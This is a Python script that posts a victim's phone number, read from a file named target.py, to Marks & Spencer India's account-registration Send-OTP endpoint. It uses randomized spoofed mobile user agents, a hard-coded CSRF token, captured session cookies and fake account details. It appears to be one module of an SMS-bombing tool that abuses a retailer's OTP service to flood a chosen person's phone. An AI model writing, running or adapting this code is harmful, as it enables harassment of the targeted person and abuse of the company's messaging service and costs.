import json
import random
from typing import Any
import requests

OTP_API_URL = "https://www.marksandspencer.in/on/demandware.store/Sites-mnsindia-Site/en_IN/Account-SendMobileOTP"

def get_random_device() -> dict[str, str]:
    devices = [
        {"model": "Infinix X6871", "android": "15", "chrome": "155"},
        {"model": "Samsung Galaxy S24", "android": "15", "chrome": "155"},
        {"model": "Redmi Note 13 Pro", "android": "14", "chrome": "154"},
        {"model": "POCO X6 Pro", "android": "14", "chrome": "155"},
        {"model": "Realme GT 6", "android": "15", "chrome": "154"},
        {"model": "Vivo V30", "android": "14", "chrome": "153"},
        {"model": "OnePlus Nord 4", "android": "15", "chrome": "155"},
        {"model": "Motorola Edge 50", "android": "14", "chrome": "154"},
        {"model": "iQOO Z9", "android": "14", "chrome": "155"},
        {"model": "Nothing Phone 2a", "android": "15", "chrome": "155"},
    ]

    d = random.choice(devices)
    build = f"AP3A.{240000 + random.randint(0, 8999)}.015.A2"
    chrome_full = f"{d['chrome']}.0.{random.randint(1000, 9999)}.{random.randint(10, 99)}"

    ua = (
        f"Mozilla/5.0 (Linux; Android {d['android']}; {d['model']} Build/{build}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_full} "
        f"Mobile Safari/537.36"
    )

    sec_ch_ua = (
        f'"Android WebView";v="{d["chrome"]}", '
        f'"Chromium";v="{d["chrome"]}", '
        f'"Not(A:Brand";v="24"'
    )

    return {
        "userAgent": ua,
        "secChUa": sec_ch_ua,
        "platform": '"Android"',
        "mobile": "?1",
    }

def main() -> dict[str, Any]:
    # ===== Load number from target.py =====
    try:
        from target import NUMBER
        number = str(NUMBER).strip()
    except Exception as e:
        return {"success": False, "message": f"Failed to load NUMBER from target.py → {e}"}

    if not (number.isdigit() and len(number) == 10):
        return {"success": False, "message": f"Invalid number in target.py: {number}"}

    device = get_random_device()

    try:
        params = {
            'flyout': "true"
        }

        payload = {
            'dwfrm_profile_customer_gender': "1",
            'dwfrm_profile_customer_firstname': "Test",
            'dwfrm_profile_customer_lastname': "Test",
            'dwfrm_profile_customer_email': "tesh@gmail.com",
            'dwfrm_profile_customer_phone': number,
            'dwfrm_profile_login_password': "C_z2ER5jRY@82aP",
            'csrf_token': "7LnRyTCYL-ogwJvkTZGkV2QEWVfOeprSW_O3r0bxWwZIwtM_jy3M3RKo1QXF4YhRZ9aVPqpuung0D4ZEVrmV0fEuea1ezk3_sKMa2_2_qgo6-Gs-eQlrV9_Oo9kMPC-4T8WKHjB7bQuTgfwnuTcQwOtTPo34-MAkUENVAPqK4tqU52zAxAk=",
            'dwfrm_profile_securekey': "1424132468",
            'dwfrm_profile_customer_addtoemaillist': "true",
            'dwfrm_profile_customer_loyaltyEnrollFlag': "true",
            'dwfrm_profile_customer_marketingConsentFlag': "true"
        }

        headers = {
            'User-Agent': device["userAgent"],
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': device["platform"],
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua': device["secChUa"],
            'sec-ch-ua-mobile': device["mobile"],
            'origin': "https://www.marksandspencer.in",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.marksandspencer.in/?srsltid=AYCX9vJEwSvjb8IbolQKxHKCx8ZzMRedqbWHUtd8d3NHKcSiJEzKMTeA",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=1, i",
            'Cookie': "dwac_5b145223621b0f7d317ba02c59=P8nEms5mDP3Uwrd9_cTzH2tzksjETPUJ9-w%3D|dw-only|||INR|false|Asia%2FCalcutta|true; cqcid=abywBr3LR1V11Ub7wXC1aJLTra; cquid=||; sid=P8nEms5mDP3Uwrd9_cTzH2tzksjETPUJ9-w; dwanonymous_65c9570179ef8c7397e951e753c5de00=abywBr3LR1V11Ub7wXC1aJLTra; __cq_dnt=0; dw_dnt=0; dwsid=iaXLY2l-MmpbCumwxieTNd0fnTFjVMueeCSzLtmBYr375EKDLBp-o01jzizx_-Ze3pd0IMhwVcIjdF33t_0pTg==; _fw_crm_v=efc0c964-f5da-41eb-d078-3470191bc55c; first_session=%7B%22visits%22%3A1%2C%22start%22%3A1793242241357%2C%22last_visit%22%3A1793242241357%2C%22url%22%3A%22https%3A%2F%2Fwww.marksandspencer.in%2F%3Fsrsltid%3DAYCX9vJEwSvjb8IbolQKxHKCx8ZzMRedqbWHUtd8d3NHKcSiJEzKMTeA%22%2C%22path%22%3A%22%2F%22%2C%22referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22referrer_info%22%3A%7B%22host%22%3A%22www.google.com%22%2C%22path%22%3A%22%2F%22%2C%22protocol%22%3A%22https%3A%22%2C%22port%22%3A80%2C%22search%22%3A%22%22%2C%22query%22%3A%7B%7D%7D%2C%22search%22%3A%7B%22engine%22%3A%22Google%22%2C%22terms%22%3Anull%7D%2C%22version%22%3A0.4%7D; AMCVS_1E4022CE527845D10A490D4D%40AdobeOrg=1; AMCV_1E4022CE527845D10A490D4D%40AdobeOrg=1406116232%7CMCIDTS%7C20756%7CMCMID%7C24560646728792516473380300229375270505%7CMCAID%7CNONE%7CMCOPTOUT-1793249441s%7CNONE%7CvVersion%7C2.5.0; s_cc=true; _fbp=fb.1.1793242247652.372128318136602230; com.silverpop.iMAWebCookie=541b813c-8377-5452-d5ea-9d0960a69adb; com.silverpop.iMA.session=8014acb0-e5c5-3d4d-d6ca-81877b5a9580; com.silverpop.iMA.page_visit=47:; utag_main=v_id:01a185911a9c00070ecb16fe24c0000980060090004ac$_sn:1$_se:6$_ss:0$_st:1793244055383$ses_id:1793242241698%3Bexp-session$_pn:1%3Bexp-session$_prevpage:Create%20Account%20Form%3Bexp-1793245855395$vapi_domain:marksandspencer.in; s_sq=msindiaprod%3D%2526c.%2526a.%2526activitymap.%2526page%253DCreate%252520Account%252520Form%2526link%253DSend%252520OTP%2526region%253Dflyout-login-form-register%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253DCreate%252520Account%252520Form%2526pidt%253D1%2526oid%253DSend%252520OTP%2526oidt%253D3%2526ot%253DSUBMIT"
        }

        resp = requests.post(
            OTP_API_URL,
            params=params,
            headers=headers,
            data=payload,
            timeout=15,
        )

        try:
            result_data = resp.json()
        except json.JSONDecodeError:
            result_data = {"raw": resp.text}

        if resp.ok:
            return {
                "success": True,
                "message": f"OTP request sent to {number}",
                "status_code": resp.status_code,
                "data": result_data,
            }
        else:
            return {
                "success": False,
                "message": f"HTTP {resp.status_code}",
                "data": result_data,
            }

    except Exception as err:
        return {"success": False, "message": str(err)}

if __name__ == "__main__":
    result = main()
    print(json.dumps(result, indent=2, ensure_ascii=False))

